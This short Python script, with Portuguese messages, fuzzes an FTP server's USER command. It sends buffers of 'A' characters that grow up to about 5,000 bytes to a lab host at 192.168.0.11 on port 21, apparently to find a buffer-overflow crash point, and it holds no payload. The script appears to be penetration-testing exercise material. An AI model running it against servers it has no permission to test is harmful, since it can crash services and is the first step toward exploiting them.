import socket

buffer = [b'A']
contador = 100
while len(buffer) <= 25:
    buffer.append(b'A' * contador)
    contador = contador + 200

for string in buffer:
    print("Fuzzing FTP USER com %s bytes" % len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.11", 21))
    s.send(b'USER ' + string + b'\r\n')